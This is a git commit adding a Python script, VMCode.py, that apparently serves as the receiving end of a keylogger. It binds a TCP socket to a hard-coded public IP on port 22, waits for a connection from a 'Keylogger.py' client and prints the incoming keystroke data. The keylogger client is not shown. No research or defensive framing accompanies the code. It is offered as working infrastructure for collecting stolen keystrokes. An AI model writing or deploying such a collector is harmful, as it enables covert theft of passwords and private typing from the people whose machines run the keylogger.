afb86f679a38335a4488280d297ca295a904cf75
Peanut-pix <noah.longing@gmail.com>
2025-04-16 00:37:13 -0500

    Add files via upload

---
+++ VMCode.py
@@ -0,0 +1,21 @@
+#Listens for connection from Keylogger.py on port 22
+import socket
+'''Specifies that IPv4 addresses are used for communication.
+Also specifies that TCP is used.'''
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#Binds IP address and port listed below to socket.
+server.bind(('4.236.133.95', 22))
+#Sets VM into listening mode. Only allows 1 connection
+server.listen(22)
+print("Listening on port 22...")
+
+#Blocks program to await for client connection.
+conn, addr = server.accept()
+print(f"Connection from {addr}")
+
+#Loop to allow VM to keep recieving incoming keystroke data.
+while True:
+    data = conn.recv(1024)
+    if not data:
+        break
+    print(data.decode(), end="")
